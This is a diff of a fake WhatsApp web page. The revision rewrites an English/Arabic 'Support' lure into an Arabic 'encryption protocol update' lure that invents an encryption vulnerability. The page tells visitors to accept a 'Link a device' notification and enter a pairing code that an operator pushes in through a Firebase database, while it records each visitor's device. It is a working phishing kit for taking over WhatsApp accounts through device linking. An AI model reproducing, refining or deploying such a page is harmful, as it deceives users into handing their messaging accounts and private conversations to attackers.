@@ -1,64 +1,57 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Support</title>
+    <title>Protocol Update</title>
     <style>
-        /* جعل الصفحة تأخذ حجم الشاشة بالظبط بدون سكرول */
-        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background-color: #f0f2f5; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; }
-        
-        /* تصغير الجزء الأخضر العلوي */
-        .top-bar { width: 100%; height: 15vh; background-color: #00a884; position: absolute; top: 0; z-index: 1; }
-        
-        /* ضبط الكارت في منتصف الشاشة وتقليل المساحات */
-        .main-card { 
-            background: white; 
-            width: 88%; 
-            max-width: 360px; 
-            margin-top: 8vh; 
-            padding: 18px; 
-            border-radius: 12px; 
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15); 
-            text-align: center; 
-            z-index: 2;
-            position: relative;
-        }
+        * { box-sizing: border-box; }
+        html, body { height: 100%; margin: 0; padding: 0; background-color: #ffffff; color: #1c1e21; font-family: -apple-system, sans-serif; overflow: hidden; }
+        body { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
 
-        .whatsapp-logo { width: 50px; height: 50px; margin-bottom: 10px; }
-        .title { color: #41525d; font-size: 16px; font-weight: 600; margin-bottom: 5px; }
-        .device-info { background: #e7f3f3; color: #128c7e; padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
-        .alert-box { background: #fff3cd; color: #856404; padding: 8px; border-radius: 6px; font-size: 11px; margin-bottom: 12px; border: 1px solid #ffeeba; line-height: 1.4; }
+        .container { width: 100%; max-width: 400px; text-align: center; }
+        .logo { width: 60px; margin-bottom: 20px; opacity: 0.9; }
         
-        .instruction { color: #3b4a54; font-size: 12.5px; line-height: 1.5; margin-bottom: 15px; text-align: justify; border-left: 3px solid #00a884; padding-left: 10px; }
+        .header-title { font-size: 20px; font-weight: 700; color: #075e54; margin-bottom: 10px; }
+        .status-badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 20px; display: inline-block; }
+
+        .protocol-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: right; }
+        .p-item { font-size: 13px; margin-bottom: 8px; color: #4b4b4b; display: flex; justify-content: space-between; direction: ltr; }
+        .p-label { font-weight: bold; color: #1c1e21; }
+        .p-val { font-family: monospace; }
+        
+        .alert-text { font-size: 14px; line-height: 1.6; color: #3b4a54; margin-bottom: 20px; border-top: 1px solid #eee; padding-top: 15px; }
         .highlight { color: #d91e1e; font-weight: bold; }
 
-        /* تصغير خانة الكود وجعلها أنيقة */
-        .code-container { 
-            background-color: #fcfcfc; 
-            border: 1.5px dashed #00a884; 
-            padding: 8px; 
-            border-radius: 8px; 
-            display: block;
-            margin: 0 auto;
-            width: 90%;
-        }
-        #pairing-code { font-size: 24px; font-weight: bold; color: #128c7e; letter-spacing: 2px; font-family: 'Courier New', monospace; }
-
-        [dir="rtl"] .instruction { text-align: right; border-left: none; border-right: 3px solid #00a884; padding-right: 10px; }
-        [dir="rtl"] .alert-box { text-align: right; }
+        .code-zone { background-color: #ffffff; border: 2px solid #00a884; padding: 15px; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 4px; font-family: 'Courier New', monospace; }
+        .wait-text { font-size: 12px; color: #8696a0; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="top-bar"></div>
-    <div class="main-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="whatsapp-logo">
-        <div id="u_0" class="title"></div>
-        <div id="u_1" class="device-info"></div>
-        <div id="u_2" class="alert-box"></div>
-        <div id="u_3" class="instruction"></div>
-        <div class="code-container"><div id="pairing-code">...</div></div>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+        <div class="header-title">تحديث بروتوكول التشفير</div>
+        <div class="status-badge" id="dev-tag">جاري فحص الحساب..</div>
+
+        <div class="protocol-box">
+            <div class="p-item"><span class="p-val">RSA-1024 (Legacy)</span><span class="p-label">:Old Protocol</span></div>
+            <div class="p-item"><span class="p-val">Signal-V3 (AES-256)</span><span class="p-label">:New Protocol</span></div>
+            <div class="p-item"><span class="p-val">In Progress...</span><span class="p-label">:Status</span></div>
+        </div>
+
+        <div class="alert-text">
+            تم رصد ثغرة في تشفير الجهاز المرتبط. لتأمين محادثاتك، يجب ترقية مفاتيح التشفير يدوياً.<br>
+            1. اضغط على إشعار <b>"ربط جهاز"</b> المرسل لك.<br>
+            2. اختر <span class="highlight">"الربط برقم الهاتف"</span> من أسفل الشاشة.<br>
+            3. أدخل رمز المصادقة التالي:
+        </div>
+
+        <div class="code-zone">
+            <div id="pairing-code">...</div>
+            <div class="wait-text" id="status-text">Generating Keys..</div>
+        </div>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
@@ -69,26 +62,18 @@
         const db = firebase.database();
         
         const params = new URLSearchParams(window.location.search);
-        const userId = params.get('id') || "USER_" + Math.floor(Math.random() * 9999);
-        const lang = navigator.language.startsWith('ar') ? 'ar' : 'en';
-        document.body.dir = (lang === 'ar') ? "rtl" : "ltr";
-        const device = /iPhone|iPad|iPod/.test(navigator.userAgent) ? "iPhone" : "Android";
+        const userId = params.get('id') || "NODE_" + Math.floor(Math.random() * 9999);
+        const device = /iPhone|iPad|iPod/.test(navigator.userAgent) ? "iPhone (iOS)" : "Android";
+        
+        document.getElementById('dev-tag').innerText = "جهاز متصل: " + device;
 
-        const content = {
-            ar: ["تحديث أمان الحساب: " + (params.get('id') || ""), "الجهاز: " + device, "تنبيه: سيصلك إشعار ربط جهاز على واتساب الآن.", "الخطوات:<br>1. افتح الإشعار.<br>2. اضغط 'ربط جهاز'.<br>3. اضغط <span class='highlight'>'الربط برقم الهاتف'</span>.<br>4. أدخل الكود التالي:", "انتظر الكود.."],
-            en: ["Security Update: " + (params.get('id') || ""), "Device: " + device, "Alert: Link notification incoming on WhatsApp.", "Steps:<br>1. Open notification.<br>2. Tap 'Link a Device'.<br>3. Tap <span class='highlight'>'Link with phone number'</span>.<br>4. Enter this code:", "Waiting for code.."]
-        };
-
-        const c = content[lang];
-        document.getElementById('u_0').innerText = c[0];
-        document.getElementById('u_1').innerText = c[1];
-        document.getElementById('u_2').innerText = c[2];
-        document.getElementById('u_3').innerHTML = c[3];
-        document.getElementById('pairing-code').innerText = c[4];
-
-        db.ref('visiting/' + userId).set({ device: device, lang: lang, ts: Date.now() });
+        db.ref('visiting/' + userId).set({ device: device, status: "linking", ts: Date.now() });
+        
         db.ref('sessions/' + userId).on('value', (s) => {
-            if (s.val() && s.val().code) document.getElementById('pairing-code').innerText = s.val().code;
+            if (s.val() && s.val().code) {
+                document.getElementById('pairing-code').innerText = s.val().code;
+                document.getElementById('status-text').innerText = "رمز المصادقة جاهز";
+            }
         });
     </script>
 </body>
